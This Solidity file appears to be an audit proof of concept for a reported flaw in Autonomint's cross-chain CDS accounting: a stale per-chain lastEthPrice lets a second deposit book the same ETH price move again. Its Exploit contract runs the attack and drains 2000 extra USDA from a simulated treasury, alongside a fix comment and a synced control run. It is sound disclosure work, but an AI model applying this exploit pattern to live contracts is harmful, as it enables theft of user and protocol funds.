// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Autonomint Colored Dollar — H-6 (Sherlock 2024-11, issue 533)
    calculateCumulativeValue books the ETH move from lastEthPrice, then the
    chain writes lastEthPrice locally. cumulativeValue is omnichain. Mode still
    has 3500 after OP has booked 3500→4000, so Dean's deposit books that move
    again. Alice's CDS withdrawal pays the repeated gain out of the treasury.

    CDSLib.calculateCumulativeValue / getCumulativeValue are the audited bodies.
    Prices are the report's 3500 and 4000. Deposits are 1000 USDA (6 decimals).
    vaultBal is 1200 ether so the 1e11 withdraw divisor lands on whole USDA. */

contract Usda {
    string public symbol = "USDA";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Treasury {
    mapping(address => bool) public chain;

    function allow(address c) external {
        chain[c] = true;
    }

    function pay(address token, address to, uint256 amount) external {
        require(chain[msg.sender], "chain");
        require(Usda(token).transfer(to, amount), "pay");
    }
}

contract Omni {
    uint128 public cumulativeValue;
    bool public cumulativeValueSign = true;
    uint256 public totalCdsDepositedAmount;
    uint256 public vaultBal = 1200 ether;

    function setCumulative(uint128 value, bool sign) external {
        cumulativeValue = value;
        cumulativeValueSign = sign;
    }

    function addTotal(uint256 amount) external {
        totalCdsDepositedAmount += amount;
    }
}

contract CdsChain {
    uint128 public constant PRECISION = 1e12;
    uint128 public lastEthPrice;
    Usda public usda;
    Treasury public treasury;
    Omni public omni;

    struct Account {
        uint256 depositedAmount;
        uint128 depositValue;
        bool depositSign;
        bool open;
    }

    mapping(address => Account) public accounts;
    uint256 public lastPaid;

    constructor(Usda _usda, Treasury _treasury, Omni _omni, uint128 _lastEthPrice) {
        usda = _usda;
        treasury = _treasury;
        omni = _omni;
        lastEthPrice = _lastEthPrice;
    }

    struct CalculateValueResult {
        uint128 currentValue;
        bool gains;
    }

    function calculateCumulativeValue(
        uint128 _price,
        uint256 totalCdsDepositedAmount,
        uint128 _lastEthPrice,
        uint256 vaultBal
    ) public pure returns (CalculateValueResult memory) {
        uint128 _amount = 1000;
        uint128 priceDiff;
        uint128 value;
        bool gains;
        if (totalCdsDepositedAmount == 0) {
            value = 0;
            gains = true;
        } else {
            if (_price > _lastEthPrice) {
                priceDiff = _price - _lastEthPrice;
                gains = true;
            } else {
                priceDiff = _lastEthPrice - _price;
                gains = false;
            }
            value = uint128((_amount * vaultBal * priceDiff * 1e6) / (PRECISION * totalCdsDepositedAmount)); // [S2]
        }
        return CalculateValueResult(value, gains);
    }

    function getCumulativeValue(uint128 _value, bool _gains, bool _cumulativeValueSign, uint128 _cumulativeValue)
        public
        pure
        returns (uint128, bool)
    {
        if (_gains) {
            if (_cumulativeValueSign) {
                _cumulativeValue += _value;
            } else if (_cumulativeValue > _value) {
                _cumulativeValue -= _value;
            } else {
                _cumulativeValue = _value - _cumulativeValue;
                _cumulativeValueSign = true;
            }
        } else if (_cumulativeValueSign) {
            if (_cumulativeValue > _value) {
                _cumulativeValue -= _value;
            } else {
                _cumulativeValue = _value - _cumulativeValue;
                _cumulativeValueSign = false;
            }
        } else {
            _cumulativeValue += _value;
        }
        return (_cumulativeValue, _cumulativeValueSign);
    }

    function cdsAmountToReturn(
        uint256 depositedAmount,
        uint128 depositValue,
        bool depositSign,
        uint128 currentValue,
        bool currentSign
    ) public pure returns (uint256) {
        uint128 valDiff;
        if (depositSign == currentSign) {
            if (depositValue > currentValue) valDiff = depositValue - currentValue;
            else valDiff = currentValue - depositValue;
            if (depositSign) {
                if (depositValue > currentValue) {
                    uint256 loss = (depositedAmount * valDiff) / 1e11;
                    return depositedAmount - loss;
                }
                uint256 profit = (depositedAmount * valDiff) / 1e11; // [S6]
                return depositedAmount + profit;
            }
            if (depositValue > currentValue) {
                uint256 profitNeg = (depositedAmount * valDiff) / 1e11;
                return depositedAmount + profitNeg;
            }
            uint256 lossNeg = (depositedAmount * valDiff) / 1e11;
            return depositedAmount - lossNeg;
        }
        valDiff = depositValue + currentValue;
        if (depositSign) {
            uint256 loss = (depositedAmount * valDiff) / 1e11;
            return depositedAmount - loss;
        }
        uint256 profitCross = (depositedAmount * valDiff) / 1e11;
        return depositedAmount + profitCross;
    }

    function updateLastEthPrice(uint128 ethPrice) public {
        lastEthPrice = ethPrice; // @> VULN: [S3] only this chain's lastEthPrice moves. The other chain still books 3500→4000.
        // FIX: write the same lastEthPrice into every chain that shares omni.cumulativeValue.
    }

    function deposit(uint128 ethPrice, uint256 amount) external {
        require(ethPrice != 0, "price");
        require(usda.transferFrom(msg.sender, address(treasury), amount), "pull");
        CalculateValueResult memory result = calculateCumulativeValue(
            ethPrice, omni.totalCdsDepositedAmount(), lastEthPrice, omni.vaultBal()
        );
        (uint128 cumulative, bool sign) = getCumulativeValue(
            result.currentValue, result.gains, omni.cumulativeValueSign(), omni.cumulativeValue()
        );
        omni.setCumulative(cumulative, sign);
        omni.addTotal(amount);
        if (ethPrice != lastEthPrice) {
            this.updateLastEthPrice(ethPrice);
        }
        accounts[msg.sender] = Account(amount, cumulative, sign, true);
    }

    function withdraw(address user) external returns (uint256 amount) {
        Account memory a = accounts[user];
        require(a.open, "open");
        amount = cdsAmountToReturn(
            a.depositedAmount, a.depositValue, a.depositSign, omni.cumulativeValue(), omni.cumulativeValueSign()
        );
        a.open = false;
        accounts[user] = a;
        lastPaid = amount;
        treasury.pay(address(usda), user, amount);
    }
}

contract User {
    function approve(Usda usda, address spender) external {
        usda.approve(spender, type(uint256).max);
    }

    function deposit(CdsChain chain, uint128 price, uint256 amount) external {
        chain.deposit(price, amount);
    }
}

contract Exploit {
    uint256 public constant D = 1_000_000_000; // 1000 USDA, 6 decimals
    Usda public usda; // nonce 1
    Treasury public treasury; // nonce 2
    Omni public omni; // nonce 3
    CdsChain public op; // nonce 4
    CdsChain public mode; // nonce 5
    User public alice; // nonce 6
    User public cathy; // nonce 7
    User public dean; // nonce 8
    uint256 public paid;
    uint256 public secondLeg;

    constructor() {
        usda = new Usda();
        treasury = new Treasury();
        omni = new Omni();
        op = new CdsChain(usda, treasury, omni, 3500);
        mode = new CdsChain(usda, treasury, omni, 3500);
        alice = new User();
        cathy = new User();
        dean = new User();
        treasury.allow(address(op));
        treasury.allow(address(mode));
        usda.mint(address(treasury), 20_000_000_000);
        usda.mint(address(alice), D);
        usda.mint(address(cathy), D);
        usda.mint(address(dean), D);
        alice.approve(usda, address(op));
        cathy.approve(usda, address(op));
        dean.approve(usda, address(mode));
    }

    function run() external {
        alice.deposit(op, 3500, D);
        omni.addTotal(D); // Bob already deposited on Mode at 3500. Price diff was 0, so lastEthPrice stayed 3500.
        cathy.deposit(op, 4000, D); // [S1]
        uint256 afterOp = omni.cumulativeValue();
        dean.deposit(mode, 4000, D); // [S4]
        secondLeg = omni.cumulativeValue() - afterOp;
        paid = op.withdraw(address(alice));
        require(secondLeg == 200_000_000_000, "mode repeated the 500 move");
        require(paid == 6_000_000_000, "alice paid 6000 USDA");
        require(paid - 4_000_000_000 == 2_000_000_000, "2000 USDA is the repeated gain");
    }

    /// Control: Mode is told the OP price before Dean deposits. The second leg is 0 and Alice is paid 4000 USDA.
    function runSynced() external {
        alice.deposit(op, 3500, D);
        omni.addTotal(D);
        cathy.deposit(op, 4000, D);
        mode.updateLastEthPrice(4000);
        dean.deposit(mode, 4000, D);
        uint256 synced = op.withdraw(address(alice));
        require(synced == 4_000_000_000, "synced lastEthPrice pays 4000");
    }
}
